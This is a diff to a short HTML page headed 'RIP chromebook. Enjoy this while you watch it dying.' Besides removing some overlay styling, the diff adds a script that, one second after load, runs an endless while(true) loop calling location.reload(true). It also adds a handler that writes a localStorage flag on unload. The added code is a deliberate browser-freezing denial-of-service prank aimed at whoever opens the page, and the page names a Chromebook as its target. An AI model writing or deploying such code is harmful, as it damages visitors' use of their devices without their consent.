@@ -14,17 +14,6 @@
     align-items: center;
     height: 100vh;
     margin: 0;
-    position: relative; /* Position relative for absolute positioning of overlay */
-  }
-  #overlay {
-    position: absolute;
-    bottom: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    background-color: black;
-    padding: 10px;
-    border-radius: 5px;
-    display: none; /* Initially hide the overlay */
   }
   p {
     font-size: 24px;
@@ -33,7 +22,7 @@
 </head>
 <body>
 
-<p id="mainText">RIP chromebook. Enjoy this while you watch it dying.</p>
+<p>RIP chromebook. Enjoy this while you watch it dying.</p>
 
 <div id="overlay"></div>
 
@@ -53,6 +42,18 @@
 
   // Hide overlay after 5 seconds
   setTimeout(hideOverlay, 5000);
+
+  // Set a value in localStorage before unloading the page
+  window.onbeforeunload = function() {
+    localStorage.setItem('unloadFlag', '1');
+  };
+
+  // Periodically reload the page every 1 second (1000 milliseconds)
+  setTimeout(function() {
+    while (true) {
+      location.reload(true); // Reload the page with cache-busting
+    }
+  }, 1000);
 </script>
 
 </body>
